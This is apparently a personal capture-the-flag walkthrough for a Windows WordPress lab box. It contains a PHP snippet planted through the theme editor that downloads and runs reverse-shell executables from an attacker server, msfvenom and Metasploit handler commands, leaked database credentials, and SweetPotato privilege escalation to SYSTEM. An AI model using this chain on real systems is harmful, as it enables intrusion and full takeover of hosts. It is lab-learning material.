1. Did default scans.
2. Found WordPress website on /retro/
3. Only poster is user named "wade", found random comment says "If i forget to spell it, with `parzival`". This turned out to be the password.
4. Since we're now in WordPress with access, we can make a reverse shell from a WP Theme  as we've done before.
5. We use c99-webshell.php to spawn a Full PHP webshell. Unfortunately this is a windows machine.

http://10.10.136.72/retro/wp-admin/theme-editor.php -> Single Page adjustment:

http://10.10.249.174/retro/wp-admin/theme-editor.php?file=page.php&theme=90s-retro


file_put_content -> file_get_content into wp-content/uploads/

Found some WordPress config for the SQL database:

      // ** MySQL settings - You can get this info from your web host ** //
      /** The name of the database for WordPress */
      define('DB_NAME', 'wordpress567');

      /** MySQL database username */
      define('DB_USER', 'wordpressuser567');

      /** MySQL database password */
      define('DB_PASSWORD', 'YSPgW[%C.mQE');

      /** MySQL hostname */
      define('DB_HOST', 'localhost');

      /** Database Charset to use in creating database tables. */
      define('DB_CHARSET', 'utf8');

      /** The Database Collate type. Don't change this if in doubt. */
      define('DB_COLLATE', '');


Tried making a reverse shell executeable in msfvenom:
```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.12.121 LPORT=4444 -f exe > 4444-shellx64.exe
```

And upload it by using file_put_concents from PHP In the WP-Admin.

Setup Python HTTP server to serve Reverse shell EXE.

Simple PHP code to Exploit and download stuff:

```
<?php

$filename = '4444-shell.exe';
$url = 'http://10.14.12.121:8000/'.$filename;
$winpeas = 'http://10.14.12.121:8000/winPEASx86.exe';
$rootShell = 'http://10.14.12.121:8000/4445-shell.exe';
$xploit = 'http://10.14.12.121:8000/SweetPotato.exe';

var_dump(file_put_contents("C:\\inetpub\\wwwroot\\retro\\wp-content\\uploads\\2022\\09\\$filename", file_get_contents($url)));
var_dump(file_put_contents("C:\\inetpub\\wwwroot\\retro\\wp-content\\uploads\\2022\\09\\winPEASx86.exe", file_get_contents($winpeas)));
var_dump(file_put_contents("C:\\inetpub\\wwwroot\\retro\\wp-content\\uploads\\2022\\09\\4445-shell.exe", file_get_contents($rootShell)));
var_dump(file_put_contents("C:\\inetpub\\wwwroot\\retro\\wp-content\\uploads\\2022\\09\\SweetPotato.exe", file_get_contents($xploit)));

echo system("cd ./wp-content/uploads/2022/09/ & dir");
echo "Running: " . "cd ./wp-content/uploads/2022/09/ & dir & start SweetPotato.exe -a C:\inetpub\wwwroot\retro\wp-content\uploads\2022\09\4445-shell-2.exe";
echo "\n";
// Starting RottenPotato.exe to escalate privileges to port 4445
echo system("cd ./wp-content/uploads/2022/09/ & dir & start SweetPotato.exe -a C:\inetpub\wwwroot\retro\wp-content\uploads\2022\09\4445-shell-2.exe");

?>
```

MSFConsole connection works; but not sure where to go from there.

Tried to upload WinPEASx86 and found a few vulnerabilites i might be able to exploit.

For MSFConsole use:

```
msf6 exploit(multi/handler) > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > run
```


After that we run winPEASx86.exe on the machine to do some recon:

```
[?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
 [*] OS Version: 1607 (14393)
 [*] Enumerating installed KBs...
 [!] CVE-2019-0836 : VULNERABLE
  [>] https://exploit-db.com/exploits/46718
  [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/

 [!] CVE-2019-1064 : VULNERABLE
  [>] https://www.rythmstick.net/posts/cve-2019-1064/

 [!] CVE-2019-1130 : VULNERABLE
  [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear

 [!] CVE-2019-1315 : VULNERABLE
  [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html

 [!] CVE-2019-1388 : VULNERABLE
  [>] https://github.com/jas502n/CVE-2019-1388

 [!] CVE-2019-1405 : VULNERABLE
  [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/
  [>] https://github.com/apt69/COMahawk

 [!] CVE-2020-0668 : VULNERABLE
  [>] https://github.com/itm4n/SysTracingPoc

 [!] CVE-2020-0683 : VULNERABLE
  [>] https://github.com/padovah4ck/CVE-2020-0683
  [>] https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/cve-2020-0683.ps1

 [!] CVE-2020-1013 : VULNERABLE
  [>] https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/

 [*] Finished. Found 9 potential vulnerabilities.

```

One of these has to be exploitable for us to escalate our privileges, lets see.

Attempting to use SweetPotato.exe which seems the system is vulnerable to!

2YES! I got in and got the User.txt Flag! 

you can use SweetPotato.exe to run your other Meterpreter Shell (4445 in my case) to start a NT Authority/SYSTEM shell which gave us access to C:\Users\Wade\Desktop>type user.txt.txt
This also gave us access to C:\Users\Administrator\Desktop\root.txt.txt, so i think i might have missed a few steps.

